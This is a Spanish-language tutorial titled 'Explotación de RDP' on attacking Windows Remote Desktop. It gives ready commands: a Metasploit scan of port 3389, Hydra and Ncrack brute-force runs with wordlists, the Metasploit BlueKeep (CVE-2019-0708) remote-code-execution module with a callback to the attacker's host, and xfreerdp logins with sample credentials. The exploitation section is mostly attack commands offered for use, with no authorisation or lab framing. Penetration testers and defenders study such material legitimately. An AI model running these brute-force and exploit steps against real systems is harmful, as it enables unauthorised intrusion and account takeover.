# Explotación de RDP (Remote Desktop Protocol)

## 1. ¿Qué es RDP y a qué afecta?

- **Remote Desktop Protocol (RDP)** es un protocolo propietario de Microsoft que permite el acceso remoto a escritorios y servidores Windows.
- Utiliza por defecto el puerto **TCP 3389**.
- Si no está bien configurado, puede ser vulnerable a:
  - Ataques de fuerza bruta.
  - Vulnerabilidades de ejecución remota.
  - Secuestro de sesión o man-in-the-middle.
  - Denegación de servicio (DoS).

RDP afecta principalmente a:
- Servidores Windows expuestos a Internet.
- Estaciones de trabajo con RDP habilitado.
- Entornos de escritorio remoto en la nube (VDI).

---

## 2. Cómo identificar un servicio RDP expuesto

### Escaneo básico con `scanner/rdp/rdp_scanner`

```
msfconsole
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS <IP_OBJETIVO>
set THREADS 10
set RPORT 3389
run
```
## 3. Vulnerabilidades conocidas en RDP

- **CVE-2019-0708 (BlueKeep)**
  - Ejecución remota sin autenticación.
  - Afecta a Windows XP, 7, Server 2003 y 2008 sin parches.
  - Se explota enviando paquetes RDP malformados.

- **CVE-2020-0609 y CVE-2020-0610**
  - Vulnerabilidades en la puerta de enlace RDP (RD Gateway).

- **Fuerza bruta**
  - Probar combinaciones de usuario y contraseña con herramientas automáticas.

---

## 4. Cómo explotar RDP

### 4.1 Ataque de fuerza bruta

Con Hydra:
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<IP> -s <Port>
```

Con Ncrack:
```
ncrack -u <USUARIO> -P <DICCIONARIO> rdp://<IP_OBJETIVO>
```

### 4.2 Explotar BlueKeep (CVE-2019-0708)

En Metasploit:
```
msfconsole
```

Luego:
```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <IP_OBJETIVO>
set RPORT 3389
set LHOST <TU_IP>
run
```

### 4.3 Acceso remoto con cliente RDP (xfreerdp)

Si ya tienes las credenciales y sólo quieres conectarte remotamente a la máquina Windows, puedes usar **xfreerdp** desde Linux:
```
xfreerdp /u:<USUARIO> /p:<CONTRASEÑA> /v:<IP_OBJETIVO>
````

Ejemplo completo:
```
xfreerdp /u:administrador /p:contraseña123 /v:192.168.1.1
```


